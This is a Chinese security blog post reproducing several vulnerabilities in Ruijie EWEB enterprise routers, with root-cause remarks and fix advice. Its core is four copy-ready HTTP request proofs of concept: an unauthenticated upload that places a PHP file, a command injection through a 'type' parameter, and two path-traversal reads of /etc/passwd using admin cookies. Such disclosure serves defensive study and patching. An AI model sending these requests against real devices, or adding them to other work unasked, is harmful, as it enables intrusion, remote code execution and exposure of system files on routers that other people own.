#  【漏洞复现】锐捷EWEB 路由器多个漏洞复现   
PokerSec  PokerSec   2025-04-23 01:01  
  
**先关注，不迷路.**  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
EWEB 路由器是锐捷网络推出的企业级 Web 管理路由器，专为中小企业和分支机构设计，提供高性能路由、安全防护和便捷的 Web 管理功能。它支持多 WAN 接入、智能负载均衡和 VPN 连接，具备防火墙、流量控制及行为管理等安全特性，同时通过直观的 Web 界面简化配置与运维，满足企业高效、稳定、安全的网络接入需求。锐捷 NBR 路由器 存在多个漏洞，攻击者可通过该漏洞获取服务器权限或读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等，导致网站处于极度不安全状态。  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJOkHgtageYMTkqSsXrfZDEHvicb1g2DyuUK4WyDNukOd277sqhHDpFKQ/640?wx_fmt=png&from=appmsg "")  
#### 文件上传  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
POST /ddi/server/fileupload.php HTTP/1.1
Host: xxxxx:4430
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXarDTbMzZe2hdNu2
Content-Length: 272

------WebKitFormBoundaryXarDTbMzZe2hdNu2
Content-Disposition: form-data; name="uploadDir"

upload
------WebKitFormBoundaryXarDTbMzZe2hdNu2
Content-Disposition: form-data; name="file";filename="2.php"

<?php phpinfo();?>
------WebKitFormBoundaryXarDTbMzZe2hdNu2--

```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJTvHPWO7tia2MvytlyROkhjWZShlFDAFHnNpOSkz75ibVIyad3fbOv7mQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJ5PIyW5R9yZICmUpGxzBdHibibt3qG72qtZJZx0vRXNAR1AvbKzWYrpwg/640?wx_fmt=png&from=appmsg "")  
#### 命令执行(需授权)  
```
POST /flow_control_pi/flwo.control.php?a=setFlowGroup HTTP/1.1
Host: xxxxx:4430
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 9
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=ob6i707k8q7ul54hf83b7pbsj6; user=admin
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

type=;id;
```  
####   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJuk24sDxDkj51cjibJUqqdnaUo6RVhclogYrUeBAPPu7ZBxwxlBsy7mw/640?wx_fmt=png&from=appmsg "")  
#### 文件读取(需授权)  
```
POST /system_pi/timeout.php?a=getFile HTTP/1.1
Host:xxxx:4430
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=ob6i707k8q7ul54hf83b7pbsj6; user=admin
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

fileName=../etc/passwd
```  
####   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJWhcNbMv2HBchvobM03RicUlsBkGPXRicZA2Mtr0K3TRBqZXtEkvDWeeg/640?wx_fmt=png&from=appmsg "")  
  
文件读取(需授权)  
```
POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
Host: xxxx:4430
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 17
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=ob6i707k8q7ul54hf83b7pbsj6; user=admin
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

path=/etc/passwd&
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJF7nLyVvpPAr8p9R5ibvj5S7UtfhsTZX36xCZHib1eIPovZ1ppZtOFiang/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
在init.php中通过获取a的值拼接action 可以访问 php文件中的任意方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJ5QPb7hFSOr4YibnibmE2Q5EkboNxSVkObro1NSX8bD11dwgm6qyjJXvw/640?wx_fmt=png&from=appmsg "")  
  
这里可以根据方法名，来构造post，拼接a=xxx来访问  
  
  
命令执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJ6HyUU6xCC7ZT0MRBg9XQEqkoZ16uwyPOGGj0P8hSybU65w3oCtsCAQ/640?wx_fmt=png&from=appmsg "")  
  
文件读取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJhQSRrJcjVvmicyoxdXg77EyFqeEUUW7GKeuQvnVgMqicCXt2nU0vZ2Ng/640?wx_fmt=png&from=appmsg "")  
  
文件读取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKficOw7rKvOrat6CGTGkFJJ2rnZLeiacb6MDvddeC0kE4U8IsBd7RxmW6O0Jn3m2Py2RqhvrRPSmbA/640?wx_fmt=png&from=appmsg "")  
  
## 修复意见  
  
1、官方已修复该漏洞，请用户联系厂商修复漏洞：  
https://www.ruijie.com.cn/  
  
2、通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
3、如非必要，禁止公网访问该系统。  
  
  
  
如有侵权，请及时联系删除。  
  
